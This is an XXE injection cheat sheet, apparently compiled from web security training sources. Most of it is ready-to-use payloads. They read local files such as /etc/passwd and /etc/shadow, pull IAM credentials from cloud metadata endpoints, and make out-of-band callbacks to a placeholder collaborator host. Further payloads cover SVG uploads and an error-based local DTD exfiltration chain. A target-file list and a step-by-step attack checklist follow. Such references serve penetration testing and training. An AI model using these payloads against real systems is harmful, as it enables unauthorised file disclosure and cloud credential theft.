# XXE Injection - Cheat Sheet

## 1. Classic XXE — File Retrieval
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd"> ]>
<data>&ext;</data>
```

## 2. Classic XXE — Internal Network / Cloud Metadata
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>
<data>&ext;</data>
```

## 3. Blind XXE — Out-of-Band Callback (confirm vulnerability)
```xml
<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://YOUR-BURP-COLLABORATOR.com"> ]>
<data>&ext;</data>
```

## 4. XInclude Attack (when you don't control the full XML document)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## 5. SVG File Upload XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px"
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  version="1.0">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

## 6. SVG File Upload — Hostname Retrieval
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY ext SYSTEM "file:///etc/hostname"> ]>
<svg width="128px" height="128px"
  xmlns="http://www.w3.org/2000/svg"
  xmlns:xlink="http://www.w3.org/1999/xlink"
  version="1.0">
  <text font-size="16" x="0" y="16">&ext;</text>
</svg>
```

## 7. Local DTD — Error-Based Data Exfiltration (last resort)
```xml
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
```

---

## Common Target Files

### Linux
```
file:///etc/passwd
file:///etc/hostname
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ
file:///proc/version
```

### Windows
```
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
```

---

## Cloud Metadata URLs
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## Known Local DTD + Entity Pairs
| DTD Path | Entity to Override |
|---|---|
| `/usr/share/yelp/dtd/docbookx.dtd` | `ISOamso` |
| `/usr/share/xml/fontconfig/fonts.dtd` | `expr` |

---

## XML Encoding Reference
| Char | Encoded |
|---|---|
| `%` | `&#x25;` |
| `&` | `&#x26;` |
| `'` | `&#x27;` |
| `<` | `&lt;` |
| `>` | `&gt;` |

---

## Quick Checklist
- [ ] Find XML input (requests, file uploads, SOAP)
- [ ] Test if entities are processed (`<!ENTITY test "hello123">`)
- [ ] Try inband file retrieval (`file:///etc/passwd`)
- [ ] If cloud → try metadata endpoint
- [ ] If no output → try outband (Burp Collaborator)
- [ ] If outband blocked → try error-based
- [ ] If all blocked → try local DTD
- [ ] Also test for XSS/SQLi inside XML data values
- [ ] Entity name and reference must always match!

---

*Reference: PortSwigger Web Security Academy + GoSecure GitHub*
